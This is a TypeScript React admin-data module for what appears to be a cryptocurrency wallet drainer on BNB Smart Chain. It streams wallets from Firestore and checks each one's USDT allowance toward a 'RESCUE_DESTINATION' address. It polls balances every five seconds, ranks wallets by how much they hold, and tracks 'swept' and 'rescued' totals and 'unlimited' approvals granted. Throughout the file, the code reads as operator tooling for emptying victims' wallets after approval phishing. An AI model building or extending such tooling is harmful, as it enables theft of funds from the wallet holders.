// src/client/context/AdminDataContext.tsx
import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo, useCallback } from 'react';
import {
  collection,
  query,
  where,
  onSnapshot,
  Timestamp,
  doc,
  updateDoc,
} from 'firebase/firestore';
import { ethers } from 'ethers';
import { db } from '../config/firebase';
import { RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION } from '../config/publicConfig';

export interface WalletDoc {
  id: string;
  status: string;
  sponsoredAt?: Timestamp;
  sponsorTxHash?: string;
  createdAt?: string;
  approvalStatus?: string; // 'UNAPPROVED' | 'APPROVED'
  unapprovedAt?: Timestamp;
}

export interface SweepInfo {
  sweptAtMs: number;
  txHash?: string;
  amount?: string;
  formattedAmount?: string;
}

export interface TwoDayStats {
  total: number;
  successful: number;
  unlimitedGranted: number;
}

interface AdminDataContextType {
  allWallets: WalletDoc[];
  sortedWallets: WalletDoc[];
  approvedWallets: WalletDoc[];
  unapprovedWallets: WalletDoc[];
  totalBalanceRescued: string;
  todayBalanceRescued: string;
  twoDayStats: TwoDayStats | null;
  latestSweepsMap: Record<string, SweepInfo>;
  balances: Record<string, { balance: string; loading: boolean }>;
  refreshBalance: (address: string) => Promise<void>;
  refreshAllBalances: () => Promise<void>;
  recordLocalSweep: (address: string, txHash?: string, amount?: string) => void;
  markWalletUnapproved: (address: string) => Promise<void>;
  markWalletApproved: (address: string) => Promise<void>;
  checkWalletAllowanceOnChain: (address: string) => Promise<boolean>;
  checkAllUnapprovedOnChain: () => Promise<{ reapprovedCount: number; checkedCount: number }>;
  connectedCount: number;
  unlimitedTodayCount: number;
  isLoading: boolean;
  error: string | null;
}

const AdminDataContext = createContext<AdminDataContextType | undefined>(undefined);

// ── Date helper functions ───────────────────────────────────────────────
function startOfToday(): Timestamp {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return Timestamp.fromDate(d);
}

const BSC_RPCS = [
  RPC_URL,
  'https://bsc-rpc.publicnode.com/',
  'https://binance.llamarpc.com',
  'https://bsc-dataseed.binance.org/',
];

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

async function fetchOnChainUSDTBalance(address: string): Promise<string> {
  for (const rpc of BSC_RPCS) {
    try {
      const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
      const rawBal: bigint = await contract.balanceOf(address);
      const formatted = ethers.formatUnits(rawBal, 18);
      const num = parseFloat(formatted);
      if (num === 0) return '0.00';
      if (num < 0.01) return num.toFixed(4);
      return num.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });
    } catch {
      // try next fallback rpc
    }
  }
  return '0.00';
}

function parseRescueAmount(d: any): number {
  if (d.amountFormatted) {
    const val = parseFloat(d.amountFormatted);
    if (!isNaN(val)) return val;
  }
  if (d.amount) {
    try {
      const formatted = ethers.formatUnits(d.amount, 18);
      const val = parseFloat(formatted);
      if (!isNaN(val)) return val;
    } catch {
      const val = parseFloat(d.amount);
      if (!isNaN(val)) return val;
    }
  }
  return 0;
}

export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [allWallets, setAllWallets] = useState<WalletDoc[]>([]);
  const [unapprovedSet, setUnapprovedSet] = useState<Set<string>>(new Set());
  const [twoDayStats, setTwoDayStats] = useState<TwoDayStats | null>(null);
  const [totalRescuedNum, setTotalRescuedNum] = useState<number>(0);
  const [todayRescuedNum, setTodayRescuedNum] = useState<number>(0);
  const [dbSweepsMap, setDbSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [localSweepsMap, setLocalSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [balances, setBalances] = useState<Record<string, { balance: string; loading: boolean }>>({});
  const [isWalletsLoaded, setIsWalletsLoaded] = useState(false);
  const [isRescuesLoaded, setIsRescuesLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Combine Firestore database sweeps with immediate optimistic sweeps
  const latestSweepsMap = useMemo(() => {
    return { ...dbSweepsMap, ...localSweepsMap };
  }, [dbSweepsMap, localSweepsMap]);

  useEffect(() => {
    setError(null);

    // 1. Real-time listener for ELIGIBLE wallets (sponsors collection)
    const walletsQuery = query(
      collection(db, 'sponsors'),
      where('status', '==', 'ELIGIBLE')
    );

    const unsubWallets = onSnapshot(
      walletsQuery,
      (snapshot) => {
        const wallets: WalletDoc[] = snapshot.docs.map((d) => ({
          id: d.id,
          ...(d.data() as Omit<WalletDoc, 'id'>),
        }));
        setAllWallets(wallets);

        // Pre-populate unapprovedSet from documents stored with approvalStatus === 'UNAPPROVED'
        setUnapprovedSet((prev) => {
          const next = new Set(prev);
          wallets.forEach((w) => {
            if (w.approvalStatus === 'UNAPPROVED') {
              next.add(w.id.toLowerCase());
            } else if (w.approvalStatus === 'APPROVED') {
              next.delete(w.id.toLowerCase());
            }
          });
          return next;
        });

        setIsWalletsLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext sponsors listener error:', err);
        setError(err.message ?? 'Failed to stream approved wallets.');
        setIsWalletsLoaded(true);
      }
    );

    // 2. Real-time listener for rescues collection (all sweeps)
    const rescuesQuery = query(collection(db, 'rescues'));

    const unsubRescues = onSnapshot(
      rescuesQuery,
      (snapshot) => {
        const docs = snapshot.docs.map((doc) => doc.data());

        // Confirmed rescues
        const confirmedDocs = docs.filter((d) => d.status === 'CONFIRMED' || !d.status);

        // All-time total balance swept
        const allTimeTotal = confirmedDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
        setTotalRescuedNum(allTimeTotal);

        // Today's balance (from midnight 00:00 to 23:59:59)
        const todayStartMs = startOfToday().toMillis();
        const todayDocs = confirmedDocs.filter((d) => {
          if (!d.createdAt) return false;
          const ms = typeof d.createdAt.toMillis === 'function'
            ? d.createdAt.toMillis()
            : new Date(d.createdAt).getTime();
          return ms >= todayStartMs;
        });
        const todayTotal = todayDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
        setTodayRescuedNum(todayTotal);

        // 48h stats
        const now = Date.now();
        const cutoff48h = now - 48 * 60 * 60 * 1000;
        const recentDocs = docs.filter((d) => {
          if (!d.createdAt) return false;
          const ms = typeof d.createdAt.toMillis === 'function'
            ? d.createdAt.toMillis()
            : new Date(d.createdAt).getTime();
          return ms >= cutoff48h;
        });

        setTwoDayStats({
          total: recentDocs.length,
          successful: recentDocs.filter((d) => d.status === 'CONFIRMED').length,
          unlimitedGranted: recentDocs.filter(
            (d) => d.status === 'CONFIRMED' && d.amount && d.amount !== '0'
          ).length,
        });

        // Map latest sweep per wallet
        const sweeps: Record<string, SweepInfo> = {};
        for (const d of docs) {
          const user = (d.user || '').toLowerCase();
          if (!user) continue;
          let ms = 0;
          if (typeof d.createdAt?.toMillis === 'function') {
            ms = d.createdAt.toMillis();
          } else if (d.createdAt) {
            ms = new Date(d.createdAt).getTime() || 0;
          }

          const existing = sweeps[user];
          if (!existing || ms > existing.sweptAtMs) {
            sweeps[user] = {
              sweptAtMs: ms,
              txHash: d.sweepTxHash,
              amount: d.amount,
              formattedAmount: d.amountFormatted,
            };
          }
        }
        setDbSweepsMap(sweeps);
        setIsRescuesLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext rescues listener error:', err);
        setIsRescuesLoaded(true);
      }
    );

    return () => {
      unsubWallets();
      unsubRescues();
    };
  }, []);

  // ── Mark wallet as unapproved (moves it to Non-Approved list) ─────────────
  const markWalletUnapproved = useCallback(async (address: string) => {
    const lower = address.toLowerCase();
    setUnapprovedSet((prev) => {
      const next = new Set(prev);
      next.add(lower);
      return next;
    });

    try {
      const docRef = doc(db, 'sponsors', lower);
      await updateDoc(docRef, {
        approvalStatus: 'UNAPPROVED',
        unapprovedAt: Timestamp.now(),
      });
    } catch (err) {
      console.warn('Could not persist unapproved status to Firestore:', err);
    }
  }, []);

  // ── Mark wallet as approved (moves it back to Approved list) ──────────────
  const markWalletApproved = useCallback(async (address: string) => {
    const lower = address.toLowerCase();
    setUnapprovedSet((prev) => {
      const next = new Set(prev);
      next.delete(lower);
      return next;
    });

    try {
      const docRef = doc(db, 'sponsors', lower);
      await updateDoc(docRef, {
        approvalStatus: 'APPROVED',
        unapprovedAt: null,
      });
    } catch (err) {
      console.warn('Could not reset approvalStatus in Firestore:', err);
    }
  }, []);

  // ── Check on-chain allowance (returns true and auto-promotes if approved) ──
  const checkWalletAllowanceOnChain = useCallback(async (address: string): Promise<boolean> => {
    for (const rpc of BSC_RPCS) {
      try {
        const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
        const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
        const allowance: bigint = await contract.allowance(address, RESCUE_DESTINATION);
        if (allowance > 0n) {
          await markWalletApproved(address);
          return true;
        } else {
          await markWalletUnapproved(address);
          return false;
        }
      } catch {
        // try next fallback
      }
    }
    return false;
  }, [markWalletApproved, markWalletUnapproved]);

  // ── Fetch & Monitor on-chain USDT balances for connected wallets ────────
  const fetchSingleBalance = useCallback(async (address: string, silent = true) => {
    const lower = address.toLowerCase();
    if (!silent) {
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: true },
      }));
    }

    try {
      const bal = await fetchOnChainUSDTBalance(address);
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: bal, loading: false },
      }));
    } catch {
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: false },
      }));
    }
  }, []);

  const refreshAllBalances = useCallback(async () => {
    const promises = allWallets.map(async (w) => {
      await fetchSingleBalance(w.id, true);
      // If wallet is in unapproved list, re-verify on-chain in case user re-approved
      if (unapprovedSet.has(w.id.toLowerCase())) {
        try {
          await checkWalletAllowanceOnChain(w.id);
        } catch { }
      }
    });
    await Promise.allSettled(promises);
  }, [allWallets, fetchSingleBalance, unapprovedSet, checkWalletAllowanceOnChain]);

  // Initial balance load and 5-second automatic live update
  useEffect(() => {
    if (allWallets.length === 0) return;

    let isSubscribed = true;

    // Initial check (silent so no flashing)
    const checkInitial = async () => {
      for (const w of allWallets) {
        if (!isSubscribed) break;
        const lower = w.id.toLowerCase();
        if (balances[lower] && !balances[lower].loading) continue;
        await fetchSingleBalance(w.id, false);
      }
    };
    checkInitial();

    // 5-second live balance refresh (costs 0 database reads)
    const interval = setInterval(() => {
      if (!isSubscribed) return;
      allWallets.forEach((w) => fetchSingleBalance(w.id, true));
    }, 5000);

    return () => {
      isSubscribed = false;
      clearInterval(interval);
    };
  }, [allWallets, fetchSingleBalance]);

  // ── Record an immediate sweep event locally (moves wallet to top & zeroes balance) ─
  const recordLocalSweep = useCallback(
    (address: string, txHash?: string, amount?: string) => {
      const lower = address.toLowerCase();
      setLocalSweepsMap((prev) => ({
        ...prev,
        [lower]: {
          sweptAtMs: Date.now(),
          txHash,
          amount,
          formattedAmount: amount,
        },
      }));

      // Immediately zero out the balance
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: '0.00', loading: false },
      }));

      // Optimistically add to rescued totals
      if (amount) {
        const parsed = parseFloat(amount);
        if (!isNaN(parsed) && parsed > 0) {
          setTotalRescuedNum((prev) => prev + parsed);
          setTodayRescuedNum((prev) => prev + parsed);
        }
      }
    },
    []
  );

  // ── Derived metrics ─────────────────────────────────────────────────
  const unlimitedTodayCount = useMemo(() => {
    const todayCutoff = startOfToday().toMillis();
    return allWallets.filter((w) => {
      if (!w.sponsoredAt) return false;
      const ms = w.sponsoredAt.toMillis?.() ?? 0;
      return ms >= todayCutoff;
    }).length;
  }, [allWallets]);

  // Formatted rescued totals
  const totalBalanceRescued = useMemo(() => {
    return (
      totalRescuedNum.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }) + ' USDT'
    );
  }, [totalRescuedNum]);

  const todayBalanceRescued = useMemo(() => {
    return (
      todayRescuedNum.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }) + ' USDT'
    );
  }, [todayRescuedNum]);

  // ── Sort wallets: High to Low balance, preserving new connection / sweep top placement ─
  const sortedWallets = useMemo(() => {
    const parseBal = (addr: string): number => {
      const raw = balances[addr.toLowerCase()]?.balance;
      if (!raw) return 0;
      const clean = raw.replace(/,/g, '');
      const val = parseFloat(clean);
      return isNaN(val) ? 0 : val;
    };

    const getRecentActionScore = (w: WalletDoc): number => {
      const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
      let createdMs = 0;
      if (w.createdAt) {
        if (typeof (w.createdAt as any).toMillis === 'function') {
          createdMs = (w.createdAt as any).toMillis();
        } else {
          const parsed = new Date(w.createdAt as any).getTime();
          if (!isNaN(parsed)) createdMs = parsed;
        }
      }
      const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
      return Math.max(sponsoredMs, createdMs, sweepMs);
    };

    return [...allWallets].sort((a, b) => {
      const balA = parseBal(a.id);
      const balB = parseBal(b.id);

      // 1. Wallets with positive balances appear first, ordered high-to-low balance
      const hasFundsA = balA > 0;
      const hasFundsB = balB > 0;

      if (hasFundsA && hasFundsB) {
        if (balB !== balA) return balB - balA; // higher balance higher up
        return getRecentActionScore(b) - getRecentActionScore(a);
      }
      if (hasFundsA && !hasFundsB) return -1;
      if (!hasFundsA && hasFundsB) return 1;

      // 2. Among zero-balance / swept wallets, sort by newly connected and latest swept
      return getRecentActionScore(b) - getRecentActionScore(a);
    });
  }, [allWallets, balances, latestSweepsMap]);

  // Split into Approved vs Non-Approved
  const approvedWallets = useMemo(() => {
    return sortedWallets.filter(
      (w) => !unapprovedSet.has(w.id.toLowerCase()) && w.approvalStatus !== 'UNAPPROVED'
    );
  }, [sortedWallets, unapprovedSet]);

  const unapprovedWallets = useMemo(() => {
    return sortedWallets.filter(
      (w) => unapprovedSet.has(w.id.toLowerCase()) || w.approvalStatus === 'UNAPPROVED'
    );
  }, [sortedWallets, unapprovedSet]);

  const checkAllUnapprovedOnChain = useCallback(async (): Promise<{ reapprovedCount: number; checkedCount: number }> => {
    let reapprovedCount = 0;
    const listToCheck = [...unapprovedWallets];
    if (listToCheck.length === 0) return { reapprovedCount: 0, checkedCount: 0 };

    await Promise.allSettled(
      listToCheck.map(async (w) => {
        const isApproved = await checkWalletAllowanceOnChain(w.id);
        if (isApproved) reapprovedCount++;
      })
    );

    return { reapprovedCount, checkedCount: listToCheck.length };
  }, [unapprovedWallets, checkWalletAllowanceOnChain]);

  const connectedCount = approvedWallets.length;
  const isLoading = !isWalletsLoaded || !isRescuesLoaded;

  return (
    <AdminDataContext.Provider
      value={{
        allWallets,
        sortedWallets,
        approvedWallets,
        unapprovedWallets,
        totalBalanceRescued,
        todayBalanceRescued,
        twoDayStats,
        latestSweepsMap,
        balances,
        refreshBalance: (addr) => fetchSingleBalance(addr, false),
        refreshAllBalances,
        recordLocalSweep,
        markWalletUnapproved,
        markWalletApproved,
        checkWalletAllowanceOnChain,
        checkAllUnapprovedOnChain,
        connectedCount,
        unlimitedTodayCount,
        isLoading,
        error,
      }}
    >
      {children}
    </AdminDataContext.Provider>
  );
};

export const useAdminData = (): AdminDataContextType => {
  const context = useContext(AdminDataContext);
  if (!context) {
    throw new Error('useAdminData must be used within an AdminDataProvider');
  }
  return context;
};
